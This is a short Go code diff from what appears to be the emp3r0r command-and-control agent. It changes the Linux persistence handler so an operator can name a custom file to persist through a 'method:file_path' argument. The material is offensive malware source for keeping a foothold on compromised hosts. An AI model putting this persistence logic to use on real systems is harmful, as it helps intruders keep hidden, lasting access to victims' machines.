@@ -6,9 +6,11 @@ package handler
 import (
 	"encoding/hex"
 	"fmt"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"strconv"
+	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
@@ -45,6 +47,18 @@ func runPersistenceLinux(cmd *cobra.Command, _ []string) {
 		c2transport.C2RespPrintf(cmd, "%s", "Error: args error")
 		return
 	}
+
+	// check if we have a custom file to persist
+	// format: method:file_path
+	if len(os.Args) > 0 {
+		modules.PersistFile = os.Args[0]
+	}
+	if strings.Contains(method, ":") {
+		parts := strings.Split(method, ":")
+		method = parts[0]
+		modules.PersistFile = parts[1]
+	}
+
 	if method == "all" {
 		err := modules.PersistAllInOne()
 		if err != nil {
